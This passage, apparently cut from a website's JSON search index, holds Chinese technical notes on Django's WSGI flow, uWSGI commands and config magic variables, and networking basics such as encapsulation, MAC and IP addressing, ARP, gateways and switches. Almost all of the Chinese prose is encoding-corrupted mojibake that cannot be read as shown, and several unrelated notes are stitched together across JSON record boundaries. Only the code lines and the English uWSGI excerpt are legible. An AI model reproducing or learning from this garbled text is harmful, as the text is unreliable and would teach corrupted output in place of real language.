ä¸ºä¾‹ï¼Œåˆ†æä¸€ä¸‹ WSGI åè®®çš„å…·ä½“å®ç°è¿‡ç¨‹ï¼š\ndjango WSGI application #  application çš„æµç¨‹åŒ…æ‹¬:\n åŠ è½½æ‰€æœ‰ä¸­é—´ä»¶ï¼Œä»¥åŠæ‰§è¡Œæ¡†æ¶ç›¸å…³çš„æ“ä½œï¼Œè®¾ç½®å½“å‰çº¿ç¨‹è„šæœ¬å‰ç¼€ï¼Œå‘é€è¯·æ±‚å¼€å§‹ä¿¡å·ï¼› å¤„ç†è¯·æ±‚ï¼Œè°ƒç”¨ get_response() æ–¹æ³•å¤„ç†å½“å‰è¯·æ±‚ï¼Œè¯¥æ–¹æ³•çš„çš„ä¸»è¦é€»è¾‘æ˜¯é€šè¿‡ urlconf æ‰¾åˆ°å¯¹åº”çš„ view å’Œ callbackï¼ŒæŒ‰é¡ºåºæ‰§è¡Œå„ç§ middleware å’Œ callbackã€‚ è°ƒç”¨ç”± server ä¼ å…¥çš„ start_response() æ–¹æ³•å°†å“åº” header ä¸ status è¿”å›ç»™ serverã€‚ è¿”å›å“åº”æ­£æ–‡  django WSGI Server #  é€šè¿‡ python manage.py runserver è¿è¡Œ django é¡¹ç›®ï¼Œåœ¨å¯åŠ¨æ—¶éƒ½ä¼šè°ƒç”¨ä¸‹é¢çš„ run æ–¹æ³•ï¼Œåˆ›å»ºä¸€ä¸ª WSGIServer çš„å®ä¾‹ï¼Œä¹‹åå†è°ƒç”¨å…¶ serve_forever() æ–¹æ³•å¯åŠ¨æœåŠ¡ã€‚\ndef run(addr, port, wsgi_handler, ipv6=False, threading=False):  server_address = (addr, port)  if threading:  httpd_cls = type(str(\u0026#39;WSGIServer\u0026#39;), (socketserver.ThreadingMixIn, WSGIServer), {})  else:  httpd_cls = WSGIServer  # è¿™é‡Œçš„wsgi_handlerå°±æ˜¯WSGIApplication  httpd = httpd_cls(server_address, WSGIRequestHandler, ipv6=ipv6)  if threading:  httpd.daemon_threads = True  httpd.set_app(wsgi_handler)  httpd.serve_forever() ä¸‹é¢è¡¨ç¤º WSGI server æœåŠ¡å™¨å¤„ç†æµç¨‹ä¸­å…³é”®çš„ç±»å’Œæ–¹æ³•ï¼š\nUWSGI #  uwsgi å‘½ä»¤è¡Œ #  å¼ºåˆ¶åœæ­¢åå°çš„æ‰€æœ‰ uwsgi è¿›ç¨‹ï¼š\n$ sudo pkill-f uwsgi -9 uwsgi é…ç½® #   è§ï¼šhttps://uwsgi-docs.readthedocs.io/en/latest/Configuration.html\n uWSGI configuration files can include â€œmagicâ€ variables, prefixed with a percent sign. Currently the following magic variables (you can access them in Python via uwsgi.magic_table) are defined:\n   %v the vassals directory (pwd)     %V the uWSGI version   %h the hostname   %o the original config filename, as specified on the command line   %O same as %o but refer to the first non-template config file (version 1.9.18)   %p the absolute path of the configuration file   %P same as %p but refer to the first non-template config file (version 1.9.18)   %s the filename of the configuration file   %S same as %s but refer to the first non-template config file (version 1.9.18)   %d the absolute path of the directory containing the configuration file   %D same as %d but refer to the first non-template config file (version 1.9.18)   %e the extension of the configuration file   %E same as %e but refer to the first non-template config file (version 1.9.18)   %n the filename without extension   %N same as %n but refer to the first non-template config file (version 1.9.18)   %c the name of the directory containing the config file (version 1.3+)   %C same as %c but refer to the first non-template config file (version 1.9.18)   %t unix time (in seconds, gathered at instance startup) (version 1.9.20-dev+)   %T unix time (in microseconds, gathered at instance startup) (version 1.9.20-dev+)   %x the current section identifier, eg. config.ini:section (version 1.9-dev+)   %X same as %x but refer to the first non-template config file (version 1.9.18)   %i inode number of the file (version 2.0.1)   %I same as %i but refer to the first non-template config file   %0..%9 a specific component of the full path of the directory containing the config file (version 1.3+)   %[ ANSI escape â€œ\\033â€ (useful for printing colors)   %k detected cpu cores (version 1.9.20-dev+)   %u uid of the user running the process (version 2.0)   %U username (if available, otherwise fallback to uid) of the user running the process (version 2.0)   %g gid of the user running the process (version 2.0)   %G group name (if available, otherwise fallback to gid) of the user running the process (version 2.0)   %j HEX representation of the djb33x hash of the full config path   %J same as %j but refer to the first non-template config file    "},{"id":396,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E5%9F%BA%E6%9C%AC%E5%8A%9F/1.%E7%BD%91%E7%BB%9C%E4%BC%A0%E8%BE%93/","title":"1.ç½‘ç»œä¼ è¾“","section":"ç½‘ç»œåŸºæœ¬åŠŸ","content":" å­¦ä¹ ç½‘å€ï¼šhttps://www.kancloud.cn/wizardforcel/network-basic/135483\n ç½‘ç»œä¼ è¾“ #  ä¼ è¾“æµç¨‹ #  ä¸‹å›¾æ˜¾ç¤ºäº†ä¸€ä¸ªç½‘ç»œæœåŠ¡å™¨å‘å®¢æˆ·ç«¯ä¼ é€æ•°æ®çš„å®Œæ•´è¿‡ç¨‹ï¼š\n  ä¼ é€çš„æ•°æ®æ˜¯ç½‘ç»œæœåŠ¡å™¨çš„HTMLé¡µé¢ã€‚\n  åº”ç”¨å±‚åè®® HTTP æŠ¥æ–‡å¤´æ·»åŠ åˆ° HTML æ•°æ®ä¹‹å‰ç”ŸæˆæŠ¥æ–‡ã€‚æŠ¥æ–‡å¤´ä¿¡æ¯åŒ…æ‹¬ï¼šæœåŠ¡å™¨æ‰€ä½¿ç”¨çš„HTTPç‰ˆæœ¬ï¼Œä»¥åŠè¡¨æ˜å®ƒåŒ…å«å‘ç»™ç½‘ç»œå®¢æˆ·ç«¯ä¿¡æ¯çš„çŠ¶æ€ç¼–ç ã€‚\n  HTTP åº”ç”¨å±‚åè®®å°† HTML æ ¼å¼çš„ç½‘é¡µæ•°æ®å‘é€ç»™ä¼ è¾“å±‚ã€‚TCP ä¼ è¾“å±‚ç”¨äºç®¡ç†ç½‘ç»œæœåŠ¡å™¨å’Œå®¢æˆ·ç«¯ä¹‹é—´çš„ TCP ä¼šè¯ã€‚\n  IP ä¿¡æ¯æ·»åŠ åˆ° TCP ä¿¡æ¯ä¹‹å‰ã€‚IP æŒ‡å®šé€‚å½“çš„æºå’Œç›®çš„ IP åœ°å€ã€‚è¿™äº›ä¿¡æ¯å°±æ„æˆäº† IP æŠ¥æ–‡ã€‚\n  ä»¥å¤ªç½‘åè®®æ·»åŠ åˆ°IPæŠ¥æ–‡çš„ä¸¤ç«¯ä¹‹åï¼Œå°±å½¢æˆäº†æ•°æ®é“¾è·¯å¸§ã€‚ä¸Šè¿°å¸§å‘é€è‡³é€šå‘ç½‘ç»œå®¢æˆ·ç«¯çš„è·¯å¾„ä¸Šçš„æœ€è¿‘ä¸€ä¸ªè·¯ç”±å™¨ã€‚è·¯ç”±å™¨ç§»é™¤ä»¥å¤ªç½‘ä¿¡æ¯ï¼Œè§‚å¯ŸIPæŠ¥æ–‡ï¼Œåˆ¤å®šæœ€ä½³è·¯å¾„ï¼Œå°†æŠ¥æ–‡æ’å…¥ä¸€ä¸ªæ–°çš„å¸§ï¼Œå¹¶å‘é€è‡³ç›®æ ‡è·¯å¾„ä¸Šä¸‹ä¸€ä¸ªç›¸é‚»è·¯ç”±å™¨ã€‚æ¯ä¸€ä¸ªè·¯ç”±å™¨åœ¨è½¬å‘ä¹‹å‰éƒ½ç§»é™¤å¹¶æ·»åŠ æ–°çš„æ•°æ®é“¾è·¯å±‚ä¿¡æ¯ã€‚\n  æ•°æ®é€šè¿‡äº’è”ç½‘ç»œä¼ è¾“ï¼Œäº’è”ç½‘ç»œåŒ…å«åª’ä»‹å’Œä¸­é—´è®¾å¤‡ã€‚\n  å®¢æˆ·ç«¯æ¥æ”¶åˆ°åŒ…å«æ•°æ®çš„æ•°æ®é“¾è·¯å¸§ï¼Œå¤„ç†å„å±‚åè®®å¤´ï¼Œä¹‹åä»¥æ·»åŠ æ—¶ç›¸åçš„é¡ºåºç§»é™¤åè®®å¤´ã€‚é¦–å…ˆå¤„ç†å¹¶ç§»é™¤ä»¥å¤ªç½‘ä¿¡æ¯ â†’ ä¹‹åæ˜¯ IP åè®®ä¿¡æ¯ â†’ æ¥ä¸‹æ¥ TCP ä¿¡æ¯ â†’ æœ€åæ˜¯ HTTP ä¿¡æ¯ã€‚\n  ä¹‹åï¼Œå°†ç½‘é¡µä¿¡æ¯ä¼ é€’ç»™å®¢æˆ·ç«¯ç½‘é¡µæµè§ˆå™¨è½¯ä»¶ã€‚\n  ä¼ è¾“æ¦‚å¿µ #  æ•°æ®å°è£… #  æ¶ˆæ¯è¦åœ¨ç½‘ç»œä¸­ä¼ è¾“ï¼Œå¿…é¡»å¯¹å®ƒè¿›è¡Œç¼–ç ï¼Œä»¥ç‰¹å®šçš„æ ¼å¼è¿›è¡Œå°è£…ï¼ŒåŒæ—¶éœ€è¦é€‚å½“åœ°å°è£…ä»¥è¶³å¤Ÿçš„æ§åˆ¶å’Œåœ°å€ä¿¡æ¯ï¼Œä»¥ä½¿å®ƒèƒ½å¤Ÿä»å‘é€æ–¹ç§»åŠ¨åˆ°æ¥æ”¶æ–¹ã€‚\næ¶ˆæ¯å¤§å° #  ç†è®ºä¸Šï¼Œè§†é¢‘æˆ–é‚®ä»¶ä¿¡æ¯æ˜¯èƒ½å¤Ÿä»¥å¤§å—éä¸­æ–­å‹æµä»ç½‘ç»œæºåœ°å€ä¼ é€åˆ°ç›®çš„åœ°å€ï¼Œä½†è¿™ä¹Ÿæ„å‘³ç€åŒä¸€æ—¶åˆ»åŒä¸€ç½‘ç»œå…¶ä»–è®¾å¤‡å°±æ— æ³•æ”¶å‘æ¶ˆæ¯ã€‚è¿™ç§å¤§å‹æ•°æ®æµä¼šé€ æˆæ˜¾è‘—å»¶æ—¶ã€‚å¹¶ä¸”ï¼Œå¦‚æœä¼ è¾“è¿‡ç¨‹ä¸­è¿æ¥æ–­å¼€ï¼Œæ•´ä¸ªæ•°æ®æµéƒ½ä¼šä¸¢å¤±éœ€è¦å…¨éƒ¨é‡ä¼ ã€‚\nå› æ­¤ï¼Œæ›´å¥½çš„æ–¹æ³•æ˜¯å°†æ•°æ®æµåˆ†å‰²ï¼ˆsegmentationï¼‰ä¸ºè¾ƒå°çš„ï¼Œä¾¿äºç®¡ç†çš„ç‰‡æ®µï¼Œèƒ½å¤Ÿå¸¦æ¥ä¸¤ç‚¹å¥½å¤„ï¼š\n å¯¹äºå‘é€ç«¯æ¥è¯´ï¼šå‘é€è¾ƒå°ç‰‡æ®µï¼Œç½‘ç»œä¸ŠåŒæ—¶å¯æœ‰å¤šä¸ªä¼šè¯äº¤é”™è¿›è¡Œã€‚è¿™ç§åœ¨ç½‘ç»œä¸Šå°†ä¸åŒä¼šè¯ç‰‡æ®µäº¤é”™è¿›è¡Œçš„è¿‡ç¨‹ç§°ä¸ºå¤šè·¯ä¼ è¾“ï¼ˆmultiplexingï¼‰ã€‚ å¯¹äºæ¥æ”¶ç«¯æ¥è¯´ï¼šâ€œåˆ†å‰²â€ å¯ä»¥æé«˜ç½‘ç»œé€šè®¯çš„å¯é æ€§ã€‚å„æ¶ˆæ¯ç‰‡æ®µä»æºåœ°å€åˆ°ç›®çš„åœ°å€æ— éœ€ç»è¿‡ç›¸åŒè·¯å¾„ï¼Œå¦‚æœä¸€æ¡è·¯å¾„è¢«å µå¡æˆ–æ–­å¼€ï¼Œå…¶ä½™æ¶ˆæ¯å¯ä»æ›¿æ¢è·¯å¾„åˆ°è¾¾ç›®çš„åœ°å€ã€‚å¦‚æœéƒ¨åˆ†æ¶ˆæ¯åˆ°ä¸äº†ç›®çš„åœ°å€ï¼Œé‚£åªéœ€é‡ä¼ ä¸¢å¤±éƒ¨åˆ†ã€‚  PostScript: éœ€è¦é€šè¿‡å¯¹ç‰‡æ®µæ‰“ä¸Šæ ‡ç­¾çš„æ–¹å¼æ¥ä¿è¯é¡ºåºä»¥åŠåœ¨æ¥æ”¶æ—¶é‡ç»„ï¼š\nåè®®æ•°æ®å•å…ƒ #  åè®®æ•°æ®å•å…ƒï¼ˆProtocol Data Unit, PDUï¼‰ï¼šæ•°æ®ç‰‡æ®µåœ¨å„å±‚ç½‘ç»œç»“æ„ä¸­é‡‡ç”¨çš„å½¢å¼ã€‚\næŒ‰ç…§ TCP/IP åè®®çš„å‘½åè§„èŒƒï¼ŒPDU åœ¨ä¸åŒç½‘ç»œå±‚çº§ç»“æ„ä¸­çš„åç§°å¦‚ä¸‹ï¼š\n   æ‰€å±ç½‘ç»œå±‚çº§ åç§°     åº”ç”¨å±‚ PDU æ•°æ® Data   ä¼ è¾“å±‚ PDU åˆ†æ®µ segment   ç½‘ç»œå±‚ PDU æ•°æ®æŠ¥ Datagram   æ•°æ®é“¾è·¯å±‚ PDU å¸§ Frame   ç‰©ç†é“¾è·¯å±‚ PDU æ¯”ç‰¹ Bits    ä»–ä»¬åŠ å…¥çš„å†…å®¹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\nè®¿é—®æœ¬åœ°èµ„æº #  è®¿é—®æœ¬åœ°ç½‘ç»œèµ„æºéœ€è¦ä¸¤ç§ç±»å‹çš„åœ°å€ï¼šç½‘ç»œå±‚åœ°å€å’Œæ•°æ®é“¾è·¯å±‚åœ°å€ã€‚ç½‘ç»œå±‚å’Œæ•°æ®é“¾è·¯å±‚è´Ÿè´£å°†æ•°æ®ä»å‘é€è®¾å¤‡ä¼ è¾“è‡³æ¥æ”¶è®¾å¤‡ã€‚ä¸¤å±‚åè®®éƒ½æœ‰æºå’Œç›®çš„åœ°å€ï¼Œä½†ä¸¤ç§åœ°å€çš„ç›®çš„ä¸åŒã€‚\næˆ‘ä»¬ä»¥ä»¥ä¸‹çš„å›¾ä¸¾ä¾‹ï¼š\nç½‘ç»œåœ°å€ #  ç½‘ç»œå±‚åœ°å€ï¼Œå³ IP åœ°å€ â†’ åŒ…å«ä¸¤ä¸ªéƒ¨åˆ†ï¼šç½‘ç»œå‰ç¼€å’Œä¸»æœºã€‚è·¯ç”±å™¨ä½¿ç”¨ç½‘ç»œå‰ç¼€éƒ¨åˆ†å°†æŠ¥æ–‡è½¬å‘ç»™é€‚å½“çš„ç½‘ç»œã€‚æœ€åä¸€ä¸ªè·¯ç”±å™¨ä½¿ç”¨ä¸»æœºéƒ¨åˆ†å°†æŠ¥æ–‡å‘é€ç»™ç›®æ ‡è®¾å¤‡ã€‚åŒä¸€æœ¬åœ°ç½‘ç»œä¸­ï¼Œç½‘ç»œå‰ç¼€éƒ¨åˆ†æ˜¯ç›¸åŒçš„ï¼Œåªæœ‰ä¸»æœºè®¾å¤‡åœ°å€éƒ¨åˆ†ä¸åŒã€‚\nå¯¹äºä»¥ä¸Šçš„ä¾‹å­ï¼š\n æº IP åœ°å€ï¼šå‘é€è®¾å¤‡ï¼Œä¸Šå›¾ä¸­å³ 192.168.1.110 ç›®çš„ IP åœ°å€ï¼šæ¥å—è®¾å¤‡ï¼Œä¸Šå›¾ä¸­å³ 192.168.1.9  æ•°æ®é“¾è·¯åœ°å€ #  æ•°æ®é“¾è·¯åœ°å€çš„ç›®çš„æ˜¯åœ¨åŒä¸€ç½‘ç»œä¸­å°†æ•°æ®é“¾è·¯å¸§ä»ä¸€ä¸ªç½‘ç»œæ¥å£å‘é€è‡³å¦ä¸€ä¸ªç½‘ç»œæ¥å£ã€‚ä»¥å¤ªç½‘ LAN (Local Area Network) å’Œæ— çº¿ç½‘ LAN æ˜¯ä¸¤ç§ä¸åŒç‰©ç†ä»‹è´¨çš„ç½‘ç»œç¤ºä¾‹ï¼Œåˆ†åˆ«æœ‰è‡ªå·±çš„æ•°æ®é“¾è·¯åè®®ã€‚\nå½“ IP æŠ¥æ–‡çš„å‘é€æ–¹å’Œæ¥æ”¶æ–¹ä½äºåŒä¸€ç½‘ç»œï¼Œæ•°æ®é“¾è·¯å¸§ç›´æ¥å‘é€åˆ°æ¥æ”¶è®¾å¤‡ã€‚ä»¥å¤ªç½‘ä¸Šæ•°æ®é“¾è·¯åœ°å€å°±æ˜¯ä»¥å¤ªç½‘ MAC åœ°å€ã€‚MAC åœ°å€æ˜¯ç‰©ç†æ¤å…¥ç½‘å¡çš„ 48 æ¯”ç‰¹åœ°å€ã€‚\nå¯¹äºä»¥ä¸Šçš„ä¾‹å­ï¼š\n æº MAC åœ°å€ï¼šå‘é€ IP æŠ¥æ–‡çš„ PC1 ä»¥å¤ªç½‘å¡ MAC åœ°å€ï¼ŒAA-AA-AA-AA-AA-AAã€‚ ç›®çš„ MAC åœ°å€ï¼šå½“å‘é€è®¾å¤‡ä¸æ¥æ”¶è®¾å¤‡ä½äºåŒä¸€ç½‘ç»œï¼Œå³ä¸ºæ¥æ”¶è®¾å¤‡çš„æ•°æ®é“¾è·¯åœ°å€ã€‚æœ¬ä¾‹ä¸­ï¼ŒFTP MAC åœ°å€ï¼šCC-CC-CC-CC-CC-CCã€‚  MAC åœ°å€ä¸ IP åœ°å€ #  ä¸ºäº†è®¿é—®ä¸€ä¸ªæœ¬åœ°èµ„æºï¼Œå‘é€æ–¹å¿…é¡»çŸ¥é“æ¥æ”¶æ–¹çš„ç‰©ç†å’Œé€»è¾‘åœ°å€ã€‚\nå‘é€æ–¹ä¸»æœºèƒ½å¤Ÿä»¥å¤šç§æ–¹å¼å­¦ä¹ åˆ°æ¥æ”¶æ–¹çš„IPåœ°å€ï¼šæ¯”å¦‚åŸŸåç³»ç»Ÿï¼ˆDomain Name System, DNSï¼‰ï¼Œæˆ–é€šè¿‡åº”ç”¨æ‰‹åŠ¨è¾“å…¥ï¼Œå¦‚ç”¨æˆ·æŒ‡å®šFTPåœ°å€ã€‚\nä»¥å¤ªç½‘ MAC åœ°å€æ˜¯æ€ä¹ˆè¯†åˆ«çš„å‘¢ï¼Ÿå‘é€æ–¹ä¸»æœºä½¿ç”¨**åœ°å€è§£æåè®®ï¼ˆAddress Resolution Protocol, ARPï¼‰**ä»¥æ£€æµ‹æœ¬åœ°ç½‘ç»œçš„æ‰€æœ‰ MAC åœ°å€ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå‘é€ä¸»æœºåœ¨æ•´ä¸ª LAN å‘é€ ARP è¯·æ±‚æ¶ˆæ¯ï¼Œè¿™æ˜¯ä¸€æ¡å¹¿æ’­æ¶ˆæ¯ã€‚ARP è¯·æ±‚åŒ…å«ç›®æ ‡è®¾å¤‡çš„ IP åœ°å€ï¼ŒLANä¸Šçš„æ¯ä¸€ä¸ªè®¾å¤‡éƒ½ä¼šæ£€æŸ¥è¯¥ARPè¯·æ±‚ï¼Œçœ‹çœ‹æ˜¯å¦åŒ…å«å®ƒè‡ªèº«çš„ IP åœ°å€ã€‚åªæœ‰ç¬¦åˆè¯¥ IP åœ°å€çš„è®¾å¤‡æ‰ä¼šå‘é€ ARP å“åº”ã€‚ARP å“åº”åŒ…å« ARP è¯·æ±‚ä¸­ IP åœ°å€ç›¸å¯¹åº”çš„ MAC åœ°å€ã€‚\nè®¿é—®è¿œç¨‹èµ„æº #  é»˜è®¤ç½‘å…³ #  é»˜è®¤ç½‘å…³ï¼šæ˜¯æŒ‡ä½äºå‘é€ä¸»æœºåŒä¸€ç½‘ç»œä¸Šçš„è·¯ç”±å™¨çš„æ¥å£ IP åœ°å€ã€‚\nå½“ä¸»æœºå‘é€æ¶ˆæ¯åˆ°è¿œç«¯ç½‘ç»œï¼Œå¿…é¡»ä½¿ç”¨è·¯ç”±å™¨ã€‚é»˜è®¤ç½‘å…³å°±æ˜¯æœ‰ä¸€ç‚¹å¾ˆé‡è¦ï¼šæœ¬åœ°ç½‘ç»œä¸Šçš„æ‰€æœ‰ä¸»æœºéƒ½èƒ½å¤Ÿé…ç½®è‡ªå·±çš„é»˜è®¤ç½‘å…³åœ°å€ã€‚å¦‚æœè¯¥ä¸»æœºçš„ TCP/IP è®¾ç½®ä¸­æ²¡æœ‰é…ç½®é»˜è®¤ç½‘å…³åœ°å€ï¼Œæˆ–æŒ‡å®šäº†é”™è¯¯çš„é»˜è®¤ç½‘å…³åœ°å€ï¼Œåˆ™è¿œç«¯ç½‘ç»œæ¶ˆæ¯æ— æ³•è¢«é€è¾¾ã€‚\nå¦‚ä¸‹å›¾æ‰€ç¤ºï¼ŒLAN ä¸Šçš„ä¸»æœº PC 1 ä½¿ç”¨ IP åœ°å€ä¸º 192.168.1.1 çš„ R1 ä½œä¸ºé»˜è®¤ç½‘å…³ï¼Œå¦‚æœ PDU çš„ç›®çš„åœ°å€ä½äºå¦ä¸€ä¸ªç½‘ç»œï¼Œåˆ™ä¸»æœºå°† PDU å‘é€è‡³è·¯ç”±å™¨ä¸Šçš„é»˜è®¤ç½‘å…³ï¼š\nç½‘ç»œåœ°å€ #  å½“æŠ¥æ–‡çš„å‘é€æ–¹ä¸æ¥æ”¶æ–¹ä½äºä¸åŒç½‘ç»œï¼Œæºå’Œç›®çš„IPåœ°å€å°†ä¼šä»£è¡¨ä¸åŒç½‘ç»œä¸Šçš„ä¸»æœºã€‚\nå¯¹äºä»¥ä¸Šçš„ä¾‹å­ï¼š\n  æºIPåœ°å€ï¼šå‘é€è®¾å¤‡å³å®¢æˆ·ç«¯ä¸»æœºPC 1çš„IPåœ°å€ï¼š192.168.1.110ã€‚\n  ç›®çš„IPåœ°å€ï¼šæ¥æ”¶è®¾å¤‡å³ç½‘ç»œæœåŠ¡å™¨çš„IPåœ°å€ï¼š172.16.1.99ã€‚\n  æ•°æ®é“¾è·¯åœ°å€ #  å½“æŠ¥æ–‡çš„å‘é€æ–¹ä¸æ¥æ”¶æ–¹ä½äºä¸åŒç½‘ç»œï¼Œä»¥å¤ªç½‘æ•°æ®é“¾è·¯å¸§æ— æ³•ç›´æ¥è¢«å‘é€åˆ°ç›®çš„ä¸»æœºã€‚ä»¥å¤ªç½‘å¸§å¿…é¡»å…ˆå‘é€ç»™è·¯ç”±å™¨æˆ–é»˜è®¤ç½‘å…³ã€‚æœ¬ä¾‹ä¸­ï¼Œé»˜è®¤ç½‘å…³æ˜¯ R1ï¼ŒR1 çš„æ¥å£ IP åœ°å€ä¸ PC 1 å±äºåŒä¸€ç½‘ç»œï¼Œå› æ­¤ PC 1 èƒ½å¤Ÿç›´æ¥è¾¾åˆ°è·¯ç”±å™¨ã€‚\nå¯¹äºä»¥ä¸Šçš„ä¾‹å­ï¼š\n  æºMACåœ°å€ï¼šå‘é€è®¾å¤‡å³PC 1çš„MACåœ°å€ï¼ŒPC1çš„ä»¥å¤ªç½‘æ¥å£MACåœ°å€ä¸ºï¼šAA-AA-AA-AA-AA-AAã€‚\n  ç›®çš„MACåœ°å€ï¼šå½“æŠ¥æ–‡çš„å‘é€æ–¹ä¸æ¥æ”¶æ–¹ä½äºä¸åŒç½‘ç»œï¼Œè¿™ä¸€å€¼ä¸ºè·¯ç”±å™¨æˆ–é»˜è®¤ç½‘å…³çš„ä»¥å¤ªç½‘MACåœ°å€ã€‚æœ¬ä¾‹ä¸­ï¼Œå³R1çš„ä»¥å¤ªç½‘æ¥å£MACåœ°å€ï¼Œå³ï¼š11-11-11-11-11-11ã€‚\n  IP æŠ¥æ–‡å°è£…æˆçš„ä»¥å¤ªç½‘å¸§å…ˆè¢«ä¼ è¾“è‡³ R1ï¼ŒR1 å†è½¬å‘ç»™ç›®çš„åœ°å€å³ç½‘ç»œæœåŠ¡å™¨ã€‚R1 å¯ä»¥è½¬å‘ç»™å¦ä¸€ä¸ªè·¯ç”±å™¨ï¼Œå¦‚æœç›®çš„æœåŠ¡å™¨æ‰€åœ¨ç½‘è·¯è¿æ¥è‡³ R1ï¼Œåˆ™ç›´æ¥å‘é€ç»™æœåŠ¡å™¨ã€‚\nå‘é€è®¾å¤‡å¦‚ä½•ç¡®å®šè·¯ç”±å™¨çš„ MAC åœ°å€ï¼Ÿæ¯ä¸€ä¸ªè®¾å¤‡é€šè¿‡è‡ªå·±çš„ TCP/IP è®¾ç½®ä¸­çš„é»˜è®¤ç½‘å…³åœ°å€å¾—çŸ¥è·¯ç”±å™¨çš„ IP åœ°å€ã€‚ä¹‹åï¼Œå®ƒé€šè¿‡ ARP æ¥å¾—çŸ¥é»˜è®¤ç½‘å…³çš„ MAC åœ°å€ï¼Œè¯¥ MAC åœ°å€éšåæ·»åŠ åˆ°å¸§ä¸­ã€‚\n"},{"id":397,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E5%9F%BA%E6%9C%AC%E5%8A%9F/2.%E4%BA%A4%E6%8D%A2%E6%9C%BA/","title":"2.äº¤æ¢æœº","section":"ç½‘ç»œåŸºæœ¬åŠŸ","content":" å­¦ä¹ ç½‘å€ï¼šhttps://www.kancloud.cn/wizardforcel/network-basic/135484\n äº¤æ¢æœº #  å¸§è½¬å‘æŠ€æœ¯\näº¤æ¢æ¦‚å¿µ #  äº¤æ¢æŒ‡åŸºäºä»¥ä¸‹ä¸¤æ¡å‡†åˆ™åšå‡ºå†³å®šçš„è®¾å¤‡ï¼š\n è¿›å…¥ï¼ˆingressï¼‰ç«¯å£ ç›®çš„åœ°å€  äº¤æ¢æœºé€šè¿‡ä»¥å¤ªç½‘å¸§ä¸­çš„æº MAC åœ°å€ä¸ç›®çš„ MAC åœ°å€ï¼Œä»æºè®¾å¤‡æ¥æ”¶åˆ°å¸§å¹¶å¿«é€Ÿå‘å¾€ç›®çš„åœ°å€ã€‚\næœ¯è¯­ ingress ç”¨äºæè¿°å¸§é€šè¿‡ç‰¹å®šç«¯å£è¿›å…¥è®¾å¤‡ï¼Œegress ç”¨äºæè¿°å¸§é€šè¿‡ç‰¹å®šç«¯å£ç¦»å¼€è®¾å¤‡ã€‚\nLANï¼ˆLocal Area Networkï¼Œå±€åŸŸç½‘ï¼‰äº¤æ¢æœºç»´æŠ¤ä¸€å¼ è¡¨ï¼Œé€šè¿‡è¿™å¼ è¡¨å†³å®šå¦‚ä½•è½¬å‘æ•°æ®æµã€‚LAN äº¤æ¢æœºå”¯ä¸€æ™ºèƒ½éƒ¨åˆ†æ˜¯åˆ©ç”¨è¿™å¼ è¡¨åŸºäºæ¶ˆæ¯çš„è¿›å…¥ç«¯å£å’Œç›®çš„åœ°å€æ¥è½¬å‘ã€‚\nä¸€ä¸ª LAN äº¤æ¢æœºä¸­åªæœ‰ä¸€å¼ å®šä¹‰äº†åœ°å€å’Œç«¯å£çš„ä¸»äº¤æ¢è¡¨ï¼›å› æ­¤ï¼Œæ— è®ºè¿›å…¥ç«¯å£å¦‚ä½•ï¼ŒåŒä¸€ç›®çš„åœ°å€çš„æ¶ˆæ¯æ°¸è¿œä»åŒä¸€å‡ºå£ç¦»å¼€ã€‚\nMAC åœ°å€è¡¨åŠ¨æ€æ›´æ–° #  ä¸€ä¸ªäº¤æ¢æœºè¦çŸ¥é“ä½¿ç”¨å“ªä¸€ä¸ªç«¯å£è¿›è¡Œä¼ é€å¸§ï¼Œé¦–å…ˆå¿…é¡»çŸ¥é“å„ä¸ªç«¯å£æœ‰å“ªäº›è®¾å¤‡ã€‚\näº¤æ¢æœºä½¿ç”¨ MAC è¡¨çš„æ–¹å¼å®Œæˆï¼Œå®ƒå»ºç«‹èµ·ä¸€å¼  MAC åœ°å€è¡¨ï¼Œå†…å®¹å¯å¯»å€å¯„å­˜è¡¨ï¼ˆCAMï¼‰ã€‚äº¤æ¢æœºå°†è¿æ¥åˆ°å®ƒçš„ç«¯å£çš„è®¾å¤‡çš„ MAC åœ°å€è®°å½•åˆ° MAC è¡¨ä¸­ï¼Œç„¶ååˆ©ç”¨è¡¨ä¸­ä¿¡æ¯å°†å¸§å‘é€è‡³è¾“å‡ºç«¯å£è®¾å¤‡ï¼Œè¯¥ç«¯å£å·²æŒ‡å®šç»™è¯¥è®¾å¤‡ã€‚\näº¤æ¢æœºæ“ä½œæ¨¡å¼çš„ä¸€å¥ç®€å•çš„è¯æ˜¯ï¼šäº¤æ¢æœºå­¦ä¹ â€œæºåœ°å€â€ï¼ŒåŸºäºâ€œç›®çš„åœ°å€â€è½¬å‘ã€‚ä»¥ä¸‹æ­¥éª¤æè¿°äº†æ›´æ–° MAC åœ°å€è¡¨çš„æ–¹æ³•ï¼š\n äº¤æ¢æœºåœ¨ port1 æ¥æ”¶åˆ°æ¥è‡ª PC1 çš„å¸§ã€‚ äº¤æ¢æœºæ£€æŸ¥æº MAC åœ°å€å¹¶ä¸ MAC åœ°å€è¡¨ç›¸æ¯”è¾ƒï¼š  å¦‚æœåœ°å€ä¸åœ¨è¡¨ä¸­ï¼Œåˆ™å°†äº¤æ¢æœºåœ¨ MAC åœ°å€è¡¨ä¸­å°† PC 1 çš„æº MAC åœ°å€å…³è”åˆ°è¿›å…¥ç«¯å£ï¼ˆport 1ï¼‰ å¦‚æœåœ°å€å·²ç»å­˜åœ¨è¯¥è¡¨ä¸­ï¼Œåˆ™äº¤æ¢æœºé‡ç½®è€åŒ–è®¡æ—¶å™¨ã€‚é€šå¸¸ä¸€ä¸ªè¡¨é¡¹ä¼šä¿æŒ 5 åˆ†é’Ÿã€‚   äº¤æ¢æœºè®°å½•æºåœ°å€ä¿¡æ¯åï¼Œæ£€æŸ¥ç›®çš„åœ°å€ï¼šå¦‚æœç›®çš„ MAC åœ°å€ä¸åœ¨è¡¨é¡¹ä¸­æˆ–å¦‚æœå®ƒæ˜¯ä¸€ä¸ªå¹¿æ’­ MAC 